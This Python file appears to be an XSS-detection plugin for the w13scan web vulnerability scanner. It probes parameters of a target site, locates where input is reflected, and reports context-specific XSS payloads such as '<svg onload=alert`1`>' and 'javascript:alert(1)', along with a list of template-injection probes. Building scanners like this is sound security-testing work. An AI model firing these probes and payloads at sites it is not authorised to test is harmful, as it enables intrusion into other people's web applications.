#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/15 3:52 PM
# @Author  : w8ay
# @File    : xss.py
import copy
import html
import random
import re
import string
from urllib.parse import unquote

import requests

from lib.core.common import random_str, generateResponse, url_dict2str
from lib.core.data import conf
from lib.core.enums import HTTPMETHOD, PLACE, VulType
from lib.core.output import ResultObject
from lib.core.plugins import PluginBase
from lib.core.settings import XSS_EVAL_ATTITUDES, TOP_RISK_GET_PARAMS
from lib.helper.htmlparser import SearchInputInResponse, random_upper, getParamsFromHtml
from lib.helper.jscontext import SearchInputInScript


class W13SCAN(PluginBase):
    name = 'XSS语义化探测插件'

    def init(self):
        self.result = ResultObject(self)
        self.result.init_info(self.requests.url, "XSS脚本注入", VulType.XSS)

    def getSSTIPayload(self, randint1=444, randint2=666) -> list:
        '''
        顺便检测下模板注入～
        return ['{123*1111}', '<%=123*1111%>', '#{123*1111}', '${{123*1111}}', '{{123*1111}}', '{{= 123*1111}}', '<# 123*1111>', '{@123*1111}', '[[123*1111]]', '${{"{{"}}123*1111{{"}}"}}']

        :return: list
        '''
        r = []
        payloads = [
            "{%d*%d}",
            "<%%=%d*%d%%>",
            "#{%d*%d}",
            "${{%d*%d}}",
            "{{%d*%d}}",
            "{{= %d*%d}}",
            "<# %d*%d>",
            "{@%d*%d}",
            "[[%d*%d]]",
            "${{\"{{\"}}%d*%d{{\"}}\"}}",
        ]
        for item in payloads:
            r.append(
                item % (randint1, randint2)
            )
        return r

    def audit(self):

        parse_params = set(getParamsFromHtml(self.response.text))
        resp = self.response.text
        params_data = {}
        self.init()
        iterdatas = []
        if self.requests.method == HTTPMETHOD.GET:
            parse_params = (parse_params | TOP_RISK_GET_PARAMS) - set(self.requests.params.keys())
            for key in parse_params:
                params_data[key] = random_str(6)
            params_data.update(self.requests.params)
            resp = requests.get(self.requests.netloc, params=params_data, headers=self.requests.headers).text
            iterdatas = self.generateItemdatas(params_data)
        elif self.requests.method == HTTPMETHOD.POST:
            parse_params = (parse_params) - set(self.requests.post_data.keys())
            for key in parse_params:
                params_data[key] = random_str(6)
            params_data.update(self.requests.post_data)
            resp = requests.post(self.requests.url, data=params_data, headers=self.requests.headers).text
            iterdatas = self.generateItemdatas(params_data)

        for origin_dict, positon in iterdatas:
            # 先不支持uri上的xss，只支持get post cookie上的xss
            if positon == PLACE.URI:
                continue
            for k, v in origin_dict.items():
                v = unquote(v)
                if v not in resp:
                    continue
                data = copy.deepcopy(origin_dict)
                # 探测回显
                xsschecker = "0x" + random_str(6, string.digits + "abcdef")
                data[k] = xsschecker
                r1 = self.req(positon, data)

                if not re.search(xsschecker, r1.text, re.I):
                    continue
                html_type = r1.headers.get("Content-Type", "").lower()

                XSS_LIMIT_CONTENT_TYPE = conf.XSS_LIMIT_CONTENT_TYPE
                if XSS_LIMIT_CONTENT_TYPE and 'html' not in html_type:
                    continue

                # 反射位置查找
                locations = SearchInputInResponse(xsschecker, r1.text)

                if len(locations) == 0:
                    # 找不到反射位置，找下自己原因?
                    flag = random_str(5)
                    payload = "<{}//".format(flag)
                    data[k] = payload
                    req = self.req(positon, data)
                    if payload in req.text:
                        self.result.add_detail("html代码未转义", req.reqinfo, generateResponse(req),
                                               "可使用<svg onload=alert`1`// 进行攻击测试,注意返回格式为:" + html_type, k, data[k],
                                               positon)

                for item in locations:
                    _type = item["type"]
                    details = item["details"]

                    if _type == "html":
                        if details["tagname"] == "style":
                            payload = "expression(a({}))".format(random_str(6, string.ascii_lowercase))
                            data[k] = payload
                            req = self.req(positon, data)
                            _locations = SearchInputInResponse(payload, req.text)
                            for _item in _locations:
                                if payload in _item["details"]["content"] and _item["details"]["tagname"] == "style":
                                    self.result.add_detail("IE下可执行的表达式", req.reqinfo, generateResponse(req.text),
                                                           "IE下可执行的表达式 expression(alert(1))", k, data[k], positon)
                                    break
                        flag = random_str(7)
                        payload = "</{}><{}>".format(random_upper(details["tagname"]), flag)
                        truepayload = "</{}>{}".format(random_upper(details["tagname"]), "<svg onload=alert`1`>")
                        data[k] = payload
                        req = self.req(positon, data)
                        _locations = SearchInputInResponse(flag, req.text)
                        for i in _locations:
                            if i["details"]["tagname"] == flag:
                                self.result.add_detail("html标签可被闭合", req.reqinfo, generateResponse(req),
                                                       "<{}>可被闭合,可使用{}进行攻击测试,注意返回格式为:{}".format(details["tagname"],
                                                                                                truepayload, html_type),
                                                       k, data[k],
                                                       positon)
                                break
                    elif _type == "attibute":
                        if details["content"] == "key":
                            # test html
                            flag = random_str(7)
                            payload = "><{} ".format(flag)
                            truepayload = "><svg onload=alert`1`>"
                            data[k] = payload
                            req = self.req(positon, data)
                            _locations = SearchInputInResponse(flag, req.text)
                            for i in _locations:
                                if i["details"]["tagname"] == flag:
                                    self.result.add_detail("html标签可被闭合", req.reqinfo, generateResponse(req),
                                                           "<{}>可被闭合,可使用{}进行攻击测试,注意返回格式为:{}".format(details["tagname"],
                                                                                                    truepayload,
                                                                                                    html_type),
                                                           k, data[k],
                                                           positon)
                                    break
                            # test attibutes
                            flag = random_str(5)
                            payload = flag + "="
                            data[k] = payload
                            req = self.req(positon, data)
                            _locations = SearchInputInResponse(flag, req.text)
                            for i in _locations:
                                for _k, v in i["details"]["attibutes"]:
                                    if _k == flag:
                                        self.result.add_detail("可自定义任意标签事件", req.reqinfo, generateResponse(req),
                                                               "可以自定义类似 'onmouseover=prompt(1)'的标签事件,注意返回格式为:" + html_type,
                                                               k, payload,
                                                               positon)
                                        break
                        else:
                            # test attibutes
                            flag = random_str(5)
                            for _payload in ["'", "\"", " "]:
                                payload = _payload + flag + "=" + _payload
                                truepayload = "{payload} onmouseover=prompt(1){payload}".format(payload=_payload)
                                data[k] = payload
                                req = self.req(positon, data)
                                _occerens = SearchInputInResponse(flag, req.text)
                                for i in _occerens:
                                    for _k, _v in i["details"]["attibutes"]:
                                        if _k == flag:
                                            self.result.add_detail("引号可被闭合，可使用其他事件造成xss", req.reqinfo,
                                                                   generateResponse(req),
                                                                   "可使用payload:{},注意返回格式为:{}".format(truepayload,
                                                                                                     html_type), k,
                                                                   payload,
                                                                   positon)
                                            break
                            # test html
                            flag = random_str(7)
                            for _payload in [r"'><{}>", "\"><{}>"]:
                                payload = _payload.format(flag)
                                data[k] = payload
                                req = self.req(positon, data)
                                _occerens = SearchInputInResponse(flag, req.text)
                                for i in _occerens:
                                    if i["details"]["tagname"] == flag:
                                        self.result.add_detail("html标签可被闭合", req.reqinfo, generateResponse(req),
                                                               "可测试payload:{}".format(
                                                                   _payload.format(
                                                                       "svg onload=alert`1`")) + ",返回格式为:" + html_type,
                                                               k, data[k],
                                                               positon)
                                        break
                            # 针对特殊属性进行处理
                            specialAttributes = ['srcdoc', 'src', 'action', 'data', 'href']  # 特殊处理属性
                            keyname = details["attibutes"][0][0]
                            tagname = details["tagname"]
                            if keyname in specialAttributes:
                                flag = random_str(7)
                                data[k] = flag
                                req = self.req(positon, data)
                                _occerens = SearchInputInResponse(flag, req.text)
                                for i in _occerens:
                                    if len(i["details"]["attibutes"]) > 0 and i["details"]["attibutes"][0][
                                        0] == keyname and \
                                            i["details"]["attibutes"][0][1] == flag:
                                        truepayload = flag
                                        if i["details"]["attibutes"][0][0] in specialAttributes:
                                            truepayload = "javascript:alert(1)"

                                        self.result.add_detail("值可控", req.reqinfo, generateResponse(req),
                                                               "{}的值可控，可能被恶意攻击,payload:{},注意返回格式为:{}".format(keyname,
                                                                                                             truepayload,
                                                                                                             html_type),
                                                               k, data[k],
                                                               positon)
                                        break
                            elif keyname == "style":
                                payload = "expression(a({}))".format(random_str(6, string.ascii_lowercase))
                                data[k] = payload
                                req = self.req(positon, data)
                                _occerens = SearchInputInResponse(payload, req.text)
                                for _item in _occerens:
                                    if payload in str(_item["details"]) and len(_item["details"]["attibutes"]) > 0 and \
                                            _item["details"]["attibutes"][0][0] == keyname:
                                        self.result.add_detail("IE下可执行的表达式", req.reqinfo, generateResponse(req.text),
                                                               "IE下可执行的表达式 payload:expression(alert(1))", k, data[k],
                                                               positon)
                                        break
                            elif keyname.lower() in XSS_EVAL_ATTITUDES:
                                # 在任何可执行的属性中
                                payload = random_str(6, string.ascii_lowercase)
                                data[k] = payload
                                req = self.req(positon, data)
                                _occerens = SearchInputInResponse(payload, req.text)
                                for i in _occerens:
                                    _attibutes = i["details"]["attibutes"]
                                    if len(_attibutes) > 0 and _attibutes[0][1] == payload and _attibutes[0][
                                        0].lower() == keyname.lower():
                                        self.result.add_detail("事件的值可控", req.reqinfo, generateResponse(req),
                                                               "{}的值可控，可能被恶意攻击,注意返回格式为:{}".format(keyname, html_type),
                                                               k, data[k], positon)
                                        break
                    elif _type == "comment":
                        flag = random_str(7)
                        for _payload in ["-->", "--!>"]:
                            payload = "{}<{}>".format(_payload, flag)
                            truepayload = payload.format(_payload, "svg onload=alert`1`")
                            data[k] = payload
                            req = self.req(positon, data)
                            _occerens = SearchInputInResponse(flag, req.text)
                            for i in _occerens:
                                if i["details"]["tagname"] == flag:
                                    self.result.add_detail("html注释可被闭合", req.reqinfo, generateResponse(req),
                                                           "html注释可被闭合 测试payload:{},注意返回格式为:{}".format(truepayload,
                                                                                                       html_type), k,
                                                           data[k],
                                                           positon)
                                    break
                    elif _type == "script":
                        # test html
                        flag = random_str(7)
                        script_tag = random_upper(details["tagname"])
                        payload = "</{}><{}>{}</{}>".format(script_tag,
                                                            script_tag, flag,
                                                            script_tag)
                        truepayload = "</{}><{}>{}</{}>".format(script_tag,
                                                                script_tag, "prompt(1)",
                                                                script_tag)
                        data[k] = payload
                        req = self.req(positon, data)
                        _occerens = SearchInputInResponse(flag, req.text)
                        for i in _occerens:
                            if i["details"]["content"] == flag and i["details"][
                                "tagname"].lower() == script_tag.lower():
                                self.result.add_detail("可以新建script标签执行任意代码", req.reqinfo, generateResponse(req),
                                                       "可以新建script标签执行任意代码 测试payload:{},注意返回格式为:{}".format(truepayload,
                                                                                                           html_type),
                                                       k,
                                                       data[k],
                                                       positon)
                                break

                        # js 语法树分析反射
                        source = details["content"]
                        _occurences = SearchInputInScript(xsschecker, source)
                        for i in _occurences:
                            _type = i["type"]
                            _details = i["details"]
                            if _type == "InlineComment":
                                flag = random_str(5)
                                payload = "\n;{};//".format(flag)
                                truepayload = "\n;{};//".format('prompt(1)')
                                data[k] = payload
                                resp = self.req(positon, data).text
                                for _item in SearchInputInResponse(flag, resp):
                                    if _item["details"]["tagname"] != "script":
                                        continue
                                    resp2 = _item["details"]["content"]
                                    output = SearchInputInScript(flag, resp2)
                                    for _output in output:
                                        if flag in _output["details"]["content"] and _output[
                                            "type"] == "ScriptIdentifier":
                                            self.result.add_detail("js单行注释bypass", req.reqinfo, generateResponse(req),
                                                                   "js单行注释可被\\n bypass,注意返回格式为:" + html_type.format(
                                                                       truepayload), k,
                                                                   data[k], positon)
                                            break

                            elif _type == "BlockComment":
                                flag = "0x" + random_str(4, "abcdef123456")
                                payload = "*/{};/*".format(flag)
                                truepayload = "*/{};/*".format('prompt(1)')
                                data[k] = payload
                                resp = self.req(positon, data).text
                                for _item in SearchInputInResponse(flag, resp):
                                    if _item["details"]["tagname"] != "script":
                                        continue
                                    resp2 = _item["details"]["content"]
                                    output = SearchInputInScript(flag, resp2)
                                    for _output in output:
                                        if flag in _output["details"]["content"] and _output[
                                            "type"] == "ScriptIdentifier":
                                            self.result.add_detail("js块注释可被bypass", req.reqinfo, generateResponse(req),
                                                                   "js单行注释可被\\n bypass,注意返回格式为:" + html_type.format(
                                                                       truepayload), k,
                                                                   data[k], positon)
                                            break
                            elif _type == "ScriptIdentifier":
                                self.result.add_detail("可直接执行任意js命令", req.reqinfo, generateResponse(req),
                                                       "ScriptIdentifier类型 测试payload：prompt(1);//,注意返回格式为:" + html_type,
                                                       k,
                                                       data[k], positon)
                            elif _type == "ScriptLiteral":
                                content = _details["content"]
                                quote = content[0]
                                flag = random_str(6)
                                if quote == "'" or quote == "\"":
                                    payload = '{quote}-{rand}-{quote}'.format(quote=quote, rand=flag)
                                    truepayload = '{quote}-{rand}-{quote}'.format(quote=quote, rand="prompt(1)")
                                else:
                                    flag = "0x" + random_str(4, "abcdef123456")
                                    payload = flag
                                    truepayload = "prompt(1)"
                                data[k] = payload
                                resp = self.req(positon, data).text
                                resp2 = None
                                for _item in SearchInputInResponse(payload, resp):
                                    if payload in _item["details"]["content"] and _item["type"] == "script":
                                        resp2 = _item["details"]["content"]

                                if not resp2:
                                    continue
                                output = SearchInputInScript(flag, resp2)

                                if output:
                                    for _output in output:
                                        if flag in _output["details"]["content"] and _output[
                                            "type"] == "ScriptIdentifier":
                                            self.result.add_detail("script脚本内容可被任意设置", req.reqinfo,
                                                                   generateResponse(req),
                                                                   "测试payload:{},注意返回格式为:{}".format(truepayload,
                                                                                                    html_type), k,
                                                                   data[k], positon)
                                            break

                # ssti检测
                # r1 = self.test_ssti(data, k, positon)
                # if r1:
                #     r2 = self.test_ssti(data, k, positon)
                #     if r2:
                #         result = self.new_result()
                #         result.init_info(self.requests.url, "SSTI模板注入", VulType.XSS)
                #         result.add_detail("第一次payload请求", r1["request"], r1["response"],
                #                           r1["desc"], k, r1["payload"], positon)
                #         result.add_detail("第二次payload请求", r2["request"], r2["response"],
                #                           r2["desc"], k, r2["payload"], positon)
                #         self.success(result)
                #         break

        if len(self.result.detail) > 0:
            self.success(self.result)

    def test_ssti(self, data, k, positon):
        randnum1 = random.randint(1000, 10000)
        randnum2 = random.randint(8888, 20000)
        checksum = str(randnum1 * randnum2)
        ssti_payloads = self.getSSTIPayload(randnum1, randnum2)
        for payload in ssti_payloads:
            data[k] = payload
            # 不编码请求
            r1 = self.req(positon, url_dict2str(data, positon))
            if checksum in r1.text:
                return {
                    "request": r1.reqinfo,
                    "response": generateResponse(r1),
                    "desc": "payload:{} 会回显{} 不编码payload".format(payload, checksum),
                    "payload": payload
                }
            # url编码请求
            r1 = self.req(positon, data)
            if checksum in r1.text:
                return {
                    "request": r1.reqinfo,
                    "response": generateResponse(r1),
                    "desc": "payload:{} 会回显{} url编码payload".format(payload, checksum),
                    "payload": payload
                }
            # html编码请求
            data[k] = html.escape(data[k])
            r1 = self.req(positon, data)
            if checksum in r1.text:
                return {
                    "request": r1.reqinfo,
                    "response": generateResponse(r1),
                    "desc": "payload:{} 会回显{} html编码payload".format(payload, checksum),
                    "payload": payload
                }
